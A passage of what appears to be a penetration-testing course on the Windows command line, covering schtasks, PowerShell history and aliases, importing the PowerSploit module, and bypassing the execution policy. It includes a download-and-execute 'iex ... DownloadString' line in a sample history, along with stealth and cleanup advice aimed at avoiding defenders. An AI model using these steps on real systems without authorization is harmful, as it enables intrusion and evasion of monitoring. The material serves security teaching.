Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up

<SNIP>  
```

* Delete the Scheduled Task(s): Delete Syntax

| Action | Parameter | Description
| ------ | --------- | -----------
| Delete | | Remove a task from the schedule
| | /tn | Identifies the task to delete.
| | /s | Specifies the name or IP address to delete the task from.
| | /u | Specifies the user to run the task as.
| | /p | Specifies the password to run the task as.
| | /f | Stops the confirmation warning.

```
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

Running `schtasks /delete` is simple enough. The thing to note is that if we do not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. Using `/F` will delete the task and suppress the message.


## PowerShell

Feature | CMD | PowerShell
------- | --- | ----------
Language | Batch and basic CMD commands only. | PowerShell can interpret Batch, CMD, PS cmdlets, and aliases.
Command utilization | The output from one command cannot be passed into another directly as a structured object, due to the limitation of handling the text output. | The output from one command can be passed into another directly as a structured object resulting in more sophisticated commands.
Command Output | Text only. | PowerShell outputs in object formatting.
Parallel Execution | CMD must finish one command before running another. | PowerShell can multi-thread commands to run in parallel.

From a stealth perspective, PowerShell's logging and history capability is powerful and will log more of our interactions with the host. So if we do not need PowerShell's capabilities and wish to be more stealthy, we should utilize CMD.

* Using Get-Help

```
PS C:\Users\htb-student> Get-Help Test-Wsman
```

* Using Update-Help to have most up-to-date information
```
PS C:\Windows\system32> Update-Help
```

* `pwd` of PowerShell
```
PS C:\Users\DLarusso> Get-Location

Path
----
C:\Users\DLarusso
```

* Listing the Directory

```
PS C:\htb> Get-ChildItem 

Directory: C:\Users\DLarusso


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/26/2021  10:26 PM                .ssh
d-----         1/28/2021   7:05 PM                .vscode
d-r---         1/27/2021   2:44 PM                3D Objects
d-r---         1/27/2021   2:44 PM                Contacts
d-r---         9/18/2022  12:35 PM                Desktop
d-r---         9/18/2022   1:01 PM                Documents
d-r---         9/26/2022  12:27 PM                Downloads
d-r---         1/27/2021   2:44 PM                Favorites
d-r---         1/27/2021   2:44 PM                Music
dar--l         9/26/2022  12:03 PM                OneDrive
d-r---         5/22/2022   2:00 PM                Pictures
```

* Move to a new directory

```
PS C:\htb>  Set-Location .\Documents\

PS C:\Users\tru7h\Documents> Get-Location

Path
----
C:\Users\DLarusso\Documents
```

* Display contents of a file

```
PS C:\htb> Get-Content Readme.md  

# ![logo][] PowerShell

Welcome to the PowerShell GitHub Community!
PowerShell Core is a cross-platform (Windows, Linux, and macOS) automation and configuration tool/framework that works well with your existing tools and is optimized
for dealing with structured data (e.g., JSON, CSV, XML, etc.), REST APIs, and object models.
It includes a command-line shell, an associated scripting language and a framework for processing cmdlets. 

<SNIP> 
```

* Get-Command

Get-Command is a great way to find a pesky command that might be slipping from our memory right when we need to use it. With PowerShell using the verb-noun convention for cmdlets, we can search on either.
```
PS C:\htb> Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Add-AppPackage                                     2.0.1.0    Appx
Alias           Add-AppPackageVolume                               2.0.1.0    Appx
Alias           Add-AppProvisionedPackage                          3.0        Dism
Alias           Add-ProvisionedAppPackage                          3.0        Dism
Alias           Add-ProvisionedAppxPackage                         3.0        Dism
Alias           Add-ProvisioningPackage                            3.0        Provisioning
Alias           Add-TrustedProvisioningCertificate                 3.0        Provisioning
Alias           Apply-WindowsUnattend                              3.0        Dism
Alias           Disable-PhysicalDiskIndication                     2.0.0.0    Storage
Alias           Disable-StorageDiagnosticLog                       2.0.0.0    Storage
Alias           Dismount-AppPackageVolume                          2.0.1.0    Appx
Alias           Enable-PhysicalDiskIndication                      2.0.0.0    Storage
Alias           Enable-StorageDiagnosticLog                        2.0.0.0    Storage
Alias           Flush-Volume                                       2.0.0.0    Storage
Alias           Get-AppPackage                                     2.0.1.0    Appx

<SNIP>  
```

```
PS C:\htb> Get-Command -verb get

<SNIP>
Cmdlet          Get-Acl                                            3.0.0.0    Microsoft.Pow...
Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.Pow...
Cmdlet          Get-AppLockerFileInformation                       2.0.0.0    AppLocker
Cmdlet          Get-AppLockerPolicy                                2.0.0.0    AppLocker
Cmdlet          Get-AppvClientApplication                          1.0.0.0    AppvClient  
<SNIP>  
```

Using the `-verb` modifier and looking for any cmdlet, alias, or function with the term get in the name, we are provided with a detailed list of everything PowerShell is currently aware of. We can also perform the exact search using the filter `get*` instead of the `-verb` `get`. The Get-Command cmdlet recognizes the `*` as a wildcard and shows each variant of `get`(anything). We can do something similar by searching on the noun as well.

```
PS C:\htb> Get-Command -noun windows*  

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Apply-WindowsUnattend                              3.0        Dism
Function        Get-WindowsUpdateLog                               1.0.0.0    WindowsUpdate
Cmdlet          Add-WindowsCapability                              3.0        Dism
Cmdlet          Add-WindowsDriver                                  3.0        Dism
Cmdlet          Add-WindowsImage                                   3.0        Dism
Cmdlet          Add-WindowsPackage                                 3.0        Dism
Cmdlet          Clear-WindowsCorruptMountPoint                     3.0        Dism
Cmdlet          Disable-WindowsErrorReporting                      1.0        WindowsErrorR...
Cmdlet          Disable-WindowsOptionalFeature                     3.0        Dism
Cmdlet          Dismount-WindowsImage                              3.0        Dism
Cmdlet          Enable-WindowsErrorReporting                       1.0        WindowsErrorR...
Cmdlet          Enable-WindowsOptionalFeature                      3.0        Dism
```

* Get-History

```
PS C:\htb> Get-History

 Id CommandLine
  -- -----------
   1 Get-Command
   2 clear
   3 get-command -verb set
   4 get-command set*
   5 clear
   6 get-command -verb get
   7 get-command -noun windows
   8 get-command -noun windows*
   9 get-module
  10 clear
  11 get-history
  12 clear
  13 ipconfig /all
  14 arp -a
  15 get-help
  16 get-help get-module
```

By default, `Get-History` will only show the commands that have been run during this active session. Notice how the commands are numbered; we can recall those commands by using the alias `r` followed by the number to run that command again. For example, if we wanted to rerun the `arp -a` command, we could issue `r 14`, and PowerShell will action it. Keep in mind that if we close the shell window, or in the instance of a remote shell through command and control, once we kill that session or process that we are running, our PowerShell history will disappear. With `PSReadLine`, however, that is not the case. `PSReadLine` stores everything in a file called `$($host.Name)_history.txt` located at `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine`.


* Viewing PSReadLine History
```
PS C:\htb> get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

get-module
Get-ChildItem Env: | ft Key,Value
Get-ExecutionPolicy
clear
ssh administrator@10.172.16.110.55
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://download.sysinternals.com/files/PSTools.zip')"
Get-ExecutionPolicy

<SNIP>
```

One feature of `PSReadline` from an admin perspective is that it will automatically attempt to filter any entries that include the strings:

*   `password`
*   `asplaintext`
*   `token`
*   `apikey`
*   `secret`

The built-in session history does not do this.

* Hotkeys

HotKey | Description
------ | -----------
CTRL+R | It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.
CTRL+L | Quick screen clear.
CTRL+ALT+Shift+? | This will print the entire list of keyboard shortcuts PowerShell will recognize.
Escape | When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit escape, which will erase the line.
↑ | Scroll up through our previous history.
↓ | Scroll down through our previous history.
F7 | Brings up a TUI with a scrollable interactive history from our session.

* Aliases

Our last tip to mention is `Aliases`. A PowerShell alias is another name for a cmdlet, command, or executable file. We can see a list of default aliases using the [Get-Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-7.2) cmdlet. Most built-in aliases are shortened versions of the cmdlet, making it easier to remember and quick to use.
```
PS C:\Windows\system32> Get-Alias

CommandType     Name
-----------     ----
Alias           % -> ForEach-Object
Alias           ? -> Where-Object
Alias           ac -> Add-Content
Alias           asnp -> Add-PSSnapin
Alias           cat -> Get-Content
Alias           cd -> Set-Location
Alias           CFS -> ConvertFrom-String
Alias           chdir -> Set-Location
Alias           clc -> Clear-Content
Alias           clear -> Clear-Host
Alias           clhy -> Clear-History
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           cls -> Clear-Host
Alias           clv -> Clear-Variable
Alias           cnsn -> Connect-PSSession
Alias           compare -> Compare-Object
Alias           copy -> Copy-Item
Alias           cp -> Copy-Item
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           curl -> Invoke-WebRequest
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoint
Alias           del -> Remove-Item
Alias           diff -> Compare-Object
Alias           dir -> Get-ChildItem

<SNIP>
```

* Using Set-Alias
```
PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
```

* Helpful Aliases

Alias | Description
----- | -----------
pwd | gl can also be used. This alias can be used in place of Get-Location.
ls | dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.
cd | sl and chdir can be used in place of cd. This is an alias for Set-Location.
cat | type and gc can also be used. This is an alias for Get-Content.
clear | Can be used in place of Clear-Host.
curl | Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.
fl and ft | These aliases can be used to format output into list and table outputs.
man | Can be used in place of help.


All About Cmdlets and Modules
=============================

* * *

In this section, we will cover the following:

*   What are cmdlets and Modules?
*   How do we interact with them?
*   How do we install and load new modules from the web?

Understanding these questions is crucial when utilizing PowerShell as both a sysadmin and pentester. PowerShells' ability to be modular and expandable makes it a powerhouse tool to have in our kit. Let us dive into what cmdlets and modules are.

* * *

Cmdlets
-------

A [cmdlet](https://docs.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-13?view=powershell-7.2) as defined by Microsoft is:

"`a single-feature command that manipulates objects in PowerShell.`"

Cmdlets follow a Verb-Noun structure which often makes it easier for us to understand what any given cmdlet does. With Test-WSMan, we can see the `verb` is `Test` and the `Noun` is `Wsman`. The verb and noun are separated by a dash (`-`). After the verb and noun, we would use the options available to us with a given cmdlet to perform the desired action. Cmdlets are similar to functions used in PowerShell code or other programming languages but have one significant difference. Cmdlets are `not` written in PowerShell. They are written in C# or another language and then compiled for use. As we saw in the last section, we can use the `Get-Command` cmdlet to view the available applications, cmdlets, and functions, along with a trait labeled "CommandType" that can help us identify its type.

If we want to see the options and functionality available to us with a specific cmdlet, we can use the [Get-Help](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-help?view=powershell-7.2) cmdlet as well as the `Get-Member` cmdlet.

* * *

PowerShell Modules
------------------

A [PowerShell module](https://docs.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.2) is structured PowerShell code that is made easy to use & share. As mentioned in the official Microsoft docs, a module can be made up of the following:

*   Cmdlets
*   Script files
*   Functions
*   Assemblies
*   Related resources (manifests and help files)

Through this section, we are going to use the PowerView project to examine what makes up a module and how to interact with them. `PowerView.ps1` is part of a collection of PowerShell modules organized in a project called [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) created by the [PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit) to provide penetration testers with many valuable tools to use when testing Windows Domain/Active Directory environments. Though we may notice this project has been archived, many of the included tools are still relevant and useful in pen-testing today (written in August 2022). We will not extensively cover the usage and implementation of PowerSploit in this module. We will just be using it as a reference to understand PowerShell better. The use of PowerSploit to Enumerate & Attack Windows Domain environments is covered in great depth in the module [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

![GitHub repository page for PowerSploit, showing file list with descriptions, commit history, and project details. Highlighted files: PowerSploit.psd1 and PowerSploit.psm1, related to Invoke-PrivescAudit. Note: Project is no longer supported.](https://academy.hackthebox.com/storage/modules/167/ImportModulePowerSploit.png)

### PowerSploit.psd1

A PowerShell data file (`.psd1`) is a [Module manifest file](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.2). Contained in a manifest file we can often find:

*   Reference to the module that will be processed
*   Version numbers to keep track of major changes
*   The GUID
*   The Author of the module
*   Copyright
*   PowerShell compatibility information
*   Modules & cmdlets included
*   Metadata

#### PowerSploit.psd1

![GIF showcasing the PowerSploit.psd1 file in the Github repository.](https://academy.hackthebox.com/storage/modules/167/PowerSploitpsd1.gif)

### PowerSploit.psm1

A PowerShell script module file (`.psm1`) is simply a script containing PowerShell code. Think of this as the meat of a module.

#### Contents of PowerSploit.psm1

All About Cmdlets and Modules

    Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
    

The Get-ChildItem cmdlet gets the items in the current directory (represented by the $PSScriptRoot automatic variable), and the Where-Object cmdlet (aliased as the "?" character) filters those down to only the items that are folders and do not have the names "Tests" or "docs". Finally, the ForEach-Object cmdlet (aliased as the "%" character) executes the Import-Module cmdlet against each of those remaining items, passing the DisableNameChecking parameter to prevent errors if the module contains cmdlets or functions with the same names as cmdlets or functions in the current session.

* * *

Using PowerShell Modules
------------------------

Once we decide what PowerShell module we want to use, we will have to determine how and from where we will run it. We also must consider if the chosen module and scripts are already on the host or if we need to get them on to the host. `Get-Module` can help us determine what modules are already loaded.

#### Get-Module

All About Cmdlets and Modules

    PS C:\htb> Get-Module 
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
    Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
    Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
    Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expan...
    Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
    

#### List-Available

All About Cmdlets and Modules

    PS C:\htb> Get-Module -ListAvailable 
    
     Directory: C:\Users\tru7h\Documents\WindowsPowerShell\Modules
    
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Script     1.1.0      PSSQLite                            {Invoke-SqliteBulkCopy, Invoke-SqliteQuery, New-SqliteConn...
    
    
        Directory: C:\Program Files\WindowsPowerShell\Modules
    
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
    Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
    Script     3.4.0      Pester                              {Describe, Context, It, Should...}
    Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
    Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...
    

The `-ListAvailable` modifier will show us all modules we have installed but not loaded into our session.

We have already transferred the desired module or scripts onto a target Windows host. We will then need to run them. We can start them through the use of the `Import-Module` cmdlet.

#### Using Import-Module

The [Import-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2) cmdlet allows us to add a module to the current PowerShell session.

All About Cmdlets and Modules

    PS C:\Users\htb-student> Get-Help Import-Module
    
    NAME
        Import-Module
    
    SYNOPSIS
        Adds modules to the current session.
    
    
    SYNTAX
        Import-Module [-Assembly] <System.Reflection.Assembly[]> [-Alias <System.String[]>] [-ArgumentList
        <System.Object[]>] [-AsCustomObject] [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force] [-Function
        <System.String[]>] [-Global] [-NoClobber] [-PassThru] [-Prefix <System.String>] [-Scope {Local | Global}]
        [-Variable <System.String[]>] [<CommonParameters>]
    
        Import-Module [-Name] <System.String[]> [-Alias <System.String[]>] [-ArgumentList <System.Object[]>]
        [-AsCustomObject] [-CimNamespace <System.String>] [-CimResourceUri <System.Uri>] -CimSession
        <Microsoft.Management.Infrastructure.CimSession> [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force]
        [-Function <System.String[]>] [-Global] [-MaximumVersion <System.String>] [-MinimumVersion <System.Version>]
        [-NoClobber] [-PassThru] [-Prefix <System.String>] [-RequiredVersion <System.Version>] [-Scope {Local | Global}]
        [-Variable <System.String[]>] [<CommonParameters>]
    
    <SNIP>
    

To understand the idea of importing the module into our current PowerShell session, we can attempt to run a cmdlet (`Get-NetLocalgroup`) that is part of PowerSploit. We will get an error message when attempting to do this without importing a module. Once we successfully import the PowerSploit module (it has been placed on the target host's Desktop for our use), many cmdlets will be available to us, including Get-NetLocalgroup. See this in action in the clip below:

#### Importing PowerSploit.psd1

All About Cmdlets and Modules

    PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
    PS C:\Users\htb-student\Desktop\PowerSploit> Get-NetLocalgroup
    
    ComputerName GroupName                           Comment
    ------------ ---------                           -------
    WS01         Access Control Assistance Operators Members of this group can remotely query authorization attributes a...
    WS01         Administrators                      Administrators have complete and unrestricted access to the compute...
    WS01         Backup Operators                    Backup Operators can override security restrictions for the sole pu...
    WS01         Cryptographic Operators             Members are authorized to perform cryptographic operations.
    WS01         Distributed COM Users               Members are allowed to launch, activate and use Distributed COM obj...
    WS01         Event Log Readers                   Members of this group can read event logs from local machine
    WS01         Guests                              Guests have the same access as members of the Users group by defaul...
    WS01         Hyper-V Administrators              Members of this group have complete and unrestricted access to all ...
    WS01         IIS_IUSRS                           Built-in group used by Internet Information Services.
    WS01         Network Configuration Operators     Members in this group can have some administrative privileges to ma...
    WS01         Performance Log Users               Members of this group may schedule logging of performance counters,...
    WS01         Performance Monitor Users           Members of this group can access performance counter data locally a...
    WS01         Power Users                         Power Users are included for backwards compatibility and possess li...
    WS01         Remote Desktop Users                Members in this group are granted the right to logon remotely
    WS01         Remote Management Users             Members of this group can access WMI resources over management prot...
    WS01         Replicator                          Supports file replication in a domain
    WS01         System Managed Accounts Group       Members of this group are managed by the system.
    WS01         Users                               Users are prevented from making accidental or intentional system-wi...
    

![GIF showcasing the Import-Module command in a PowerShell window and importing the PowerSploit.psd1 module.](https://academy.hackthebox.com/storage/modules/167/Import-Module.gif)

Notice how at the beginning of the clip, `Get-NetLocalgroup` was not recognized. This event happened because it is not included in the default module path. We see where the default module path is by listing the environment variable `PSModulePath`.

#### Viewing PSModulePath

All About Cmdlets and Modules

    PS C:\Users\htb-student> $env:PSModulePath
    
    C:\Users\htb-student\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    

When the PowerSploit.psd1 module is imported, the `Get-NetLocalgroup` function is recognized. This happens because several modules are included when we load PowerSploit.psd1. It is possible to permanently add a module or several modules by adding the files to the referenced directories in the PSModulePath. This action makes sense if we were using a Windows OS as our primary attack host, but on an engagement, our time would be better off just transferring specific scripts over to the attack host and importing them as needed.

* * *

Execution Policy
----------------

An essential factor to consider when attempting to use PowerShell scripts and modules is [PowerShell's execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2). As outlined in Microsoft's official documentation, an execution policy is not a security control. It is designed to give IT admins a tool to set parameters and safeguards for themselves.

#### Execution Policy's Impact

All About Cmdlets and Modules

    PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
    
    Import-Module : File C:\Users\Users\htb-student\PowerSploit.psm1
    cannot be loaded because running scripts is disabled on this system. For more information, see
    about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
    At line:1 char:1
    + Import-Module .\PowerSploit.psd1
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
        + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
    

The host's execution policy makes it so that we cannot run our script. We can get around this, however. First, let us check our execution policy settings.

#### Checking Execution Policy State

All About Cmdlets and Modules

    PS C:\htb> Get-ExecutionPolicy 
    
    Restricted  
    

Our current setting restricts what the user can do. If we want to change the setting, we can do so with the `Set-ExecutionPolicy` cmdlet.

#### Setting Execution Policy

All About Cmdlets and Modules

    PS C:\htb> Set-ExecutionPolicy undefined 
    

By setting the policy to undefined, we are telling PowerShell that we do not wish to limit our interactions. Now we should be able to import and run our script.

#### Testing It Out

All About Cmdlets and Modules

    PS C:\htb> Import-Module .\PowerSploit.psd1
    
    Import-Module .\PowerSploit.psd1
    PS C:\Users\htb> get-module
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Check...
    Manifest   3.0.0.0    Microsoft.PowerShell.Security       {ConvertFrom-SecureString, Conver...
    Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Vari...
    Script     3.0.0.0    PowerSploit                         {Add-Persistence, Add-ServiceDacl...
    Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PS...
    

Looking at our loaded modules, we can see that we successfully loaded PowerSploit. Now we can use the tools as needed.

**Note: As a sysadmin, these kinds of changes are common and should always be reverted once we are done with work. As a pentester, us making a change like this and not reverting it could indicate to a defender that the host has been compromised. Be sure to check that we clean up after our actions. Another way we can bypass the execution policy and not leave a persistent change is to change it at the process level using -scope.**

#### Change Execution Policy By Scope

All About Cmdlets and Modules

    PS C:\htb> Set-ExecutionPolicy -scope Process 
    PS C:\htb> Get-ExecutionPolicy -list
    
    Scope ExecutionPolicy
            ----- ---------------
    MachinePolicy       Undefined
       UserPolicy       Undefined
          Process          Bypass
      CurrentUser       Undefined
     LocalMachine          Bypass  
    

By changing it at the Process level, our change will revert once we close the PowerShell session. Keep the execution policy in mind when working with scripts and new modules. Of course, we want to look at the scripts we are trying to load first to ensure they are safe for use. As penetration testers, we may run into times when we need to be creative about how we bypass the Execution Policy on a host. This [blog post](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) has some creative ways that we have used on real-world engagements with great success.

### Calling Cmdlets and Functions From Within a Module

If we wish to see what aliases, cmdlets, and functions an imported module brought to the session, we can use `Get-Command -Module <modulename>` to enlighten us.

#### Using Get-Command

All About Cmdlets and Modules

    PS C:\htb> Get-Command -Module PowerSploit
    
    CommandType     Name                                               Version    Source
    -----------     ----                                               -------    ------
    Alias           Invoke-ProcessHunter                               3.0.0.0    PowerSploit
    Alias           Invoke-ShareFinder                                 3.0.0.0    PowerSploit
    Alias           Invoke-ThreadedFunction                            3.0.0.0    PowerSploit
    Alias           Invoke-UserHunter                                  3.0.0.0    PowerSploit
    Alias           Request-SPNTicket                                  3.0.0.0    PowerSploit
    Alias           Set-ADObject                                       3.0.0.0    PowerSploit
    Function        Add-Persistence                                    3.0.0.0    PowerSploit
    Function        Add-ServiceDacl                                    3.0.0.0    PowerSploit
    Function        Find-AVSignature                                   3.0.0.0    PowerSploit
    Function        Find-InterestingFile                               3.0.0.0    PowerSploit
    Function        Find-LocalAdminAccess                              3.0.0.0    PowerSploit
    Function        Find-PathDLLHijack                                 3.0.0.0    PowerSploit
    Function        Find-ProcessDLLHijack                              3.0.0.0    PowerSploit
    Function        Get-ApplicationHost                                3.0.0.0    PowerSploit
    Function        Get-GPPPassword                                    3.0.0.0    PowerSploit
    

Now we can see what was loaded by PowerSploit. From this point, we can use the scripts and functions as needed. This is the easy part, pick the function and let it run.

### Deep Dive: Finding & Installing Modules from PowerShell Gallery & GitHub

In today's day and age, sharing information is extremely easy. That goes for solutions and new creations as well. When it comes to PowerShell modules, the [PowerShell Gallery](https://www.powershellgallery.com/) Is the best place for that. It is a repository that contains PowerShell scripts, modules, and more created by Microsoft and other users. They can range from anything as simple as dealing with user attributes to solving complex cloud storage issues.

#### PowerShell Gallery

![PowerShell Gallery homepage showing search bar, statistics on unique packages, total downloads, and total packages. Includes sections for learning about the gallery and top package downloads like NetworkingDsc and PSWindowsUpdate.](https://academy.hackthebox.com/storage/modules/167/powershellg.png)

Conveniently for us, There is already a module built into PowerShell meant to help us interact with the PowerShell Gallery called `PowerShellGet`. Let us take a look at it:

#### PowerShellGet

All About Cmdlets and Modules

    PS C:\htb> Get-Command -Module PowerShellGet 
    
    CommandType     Name                                               Version    Source
    -----------     ----                                               -------    ------
    Function        Find-Command                                       1.0.0.1    PowerShellGet
    Function        Find-DscResource                                   1.0.0.1    PowerShellGet
    Function        Find-Module                                        1.0.0.1    PowerShellGet
    Function        Find-RoleCapability                                1.0.0.1    PowerShellGet
    Function        Find-Script                                        1.0.0.1    PowerShellGet
    Function        Get-InstalledModule                                1.0.0.1    PowerShellGet
    Function        Get-InstalledScript                                1.0.0.1    PowerShellGet
    Function        Get-PSRepository                                   1.0.0.1    PowerShellGet
    Function        Install-Module                                     1.0.0.1    PowerShellGet
    Function        Install-Script                                     1.0.0.1    PowerShellGet
    Function        New-ScriptFileInfo                                 1.0.0.1    PowerShellGet
    Function        Publish-Module                                     1.0.0.1    PowerShellGet
    Function        Publish-Script                                     1.0.0.1    PowerShellGet
    Function        Register-PSRepository                              1.0.0.1    PowerShellGet
    Function        Save-Module                                        1.0.0.1    PowerShellGet
    Function        Save-Script                                        1.0.0.1    PowerShellGet
    Function        Set-PSRepository                                   1.0.0.1    PowerShellGet
    Function        Test-ScriptFileInfo                                1.0.0.1    PowerShellGet
    Function        Uninstall-Module                                   1.0.0.1    PowerShellGet
    Function        Uninstall-Script                                   1.0.0.1    PowerShellGet
    Function        Unregister-PSRepository                            1.0.0.1    PowerShellGet
    Function        Update-Module                                      1.0.0.1    PowerShellGet
    Function        Update-ModuleManifest                              1.0.0.1    PowerShellGet
    Function        Update-Script                                      1.0.0.1    PowerShellGet
    Function        Update-ScriptFileInfo                              1.0.0.1    PowerShellGet
    

This module has many different functions to help us work with and download existing modules from the gallery and make and upload our own. From our function listing, let us give Find-Module a try. One module that will prove extremely useful to system admins is the [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8) module. It is a collection of several other modules with tools meant for Active Directory management, Microsoft Exchange, virtualization, and many other tasks an admin would need on any given day.

#### Find-Module

All About Cmdlets and Modules

    PS C:\htb> Find-Module -Name AdminToolbox 
    
    Version    Name                                Repository           Description
    -------    ----                                ----------           -----------
    11.0.8     AdminToolbox                        PSGallery            Master module for a col...
    

Like with many other PowerShell cmdlets, we can also search using wildcards. Once we have found a module we wish to utilize, installing it is as easy as `Install-Module`. Remember that it requires administrative rights to install modules in this manner.

#### Install-Module

![GIF showcasing the Install-Module command piped to the Find-Module command in a PowerShell window.](https://academy.hackthebox.com/storage/modules/167/admintoolbox.gif)

In the image above, we chained `Find-Module` with `Install-Module` to simultaneously perform both actions. This example takes advantage of PowerShell's Pipeline functionality. We will cover this deeper in another section, but for now, it allowed us to find and install the module with one command string. Remember that modern instances of PowerShell will auto-import a module installed the first time we run a cmdlet or function from it, so there is no need to import the module after installing it. This differs from custom modules or modules we bring onto the host (from GitHub, for example). We will have to manually import it each time we want to use it unless we modify our PowerShell Profile. We can find the locations for each specific PowerShell profile [Here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.2). Besides creating our own modules and scripts or importing them from the PowerShell Gallery, we can also take advantage of [Github](https://github.com/) and all the amazing content the IT community has come up with externally. Utilizing `Git` and `Github` for now requires the installation of other applications and knowledge of other concepts we have yet to cover, so we will save this for later in the module.

### Tools To Be Aware Of

Below we will quickly list a few PowerShell modules and projects we, as penetration testers and sysadmins, should be aware of. Each of these tools brings a new capability to use within PowerShell. Of course, there are plenty more than just our list; these are just several we find ourselves returning to on every engagement.

*   [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8): AdminToolbox is a collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.
    
*   [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps): This module is a collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.
    
*   [Empire / Situational Awareness](https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module_source/situational_awareness): Is a collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by [BC Security](https://github.com/BC-SECURITY) as a part of their Empire Framework.
    
*   [Inveigh](https://github.com/Kevin-Robertson/Inveigh): Inveigh is a tool built to perform network spoofing and Man-in-the-middle attacks.
    
*   [BloodHound / SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors): Bloodhound/Sharphound allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.
    

* * *

User and Group Management
=========================

* * *

As a system administrator, user and group management is a key skill as our users are often our main asset to manage and, usually, an organization's largest attack vector. As pentesters, understanding how to enumerate, interpret, and take advantage of users and groups is one of the easiest ways to gain access and elevate our privileges during a pentest engagement. This section will cover what users and groups are, how to manage them with PowerShell, and briefly introduce the concept of Active Directory domains and domain users.

* * *

What are User Accounts?
-----------------------

User accounts are a way for personnel to access and use a host's resources. In certain circumstances, the system will also utilize a specially provisioned user account to perform actions. When thinking about accounts, we typically run into four different types:

*   Service Accounts
*   Built-in accounts
*   Local users
*   Domain users

### Default Local User Accounts

Several accounts are created in every instance of Windows as the OS is installed to help with host management and basic usage. Below is a list of the standard built-in accounts.

#### Built-In Accounts

**Account**

**Description**

`Administrator`

This account is used to accomplish administrative tasks on the local host.

`Default Account`

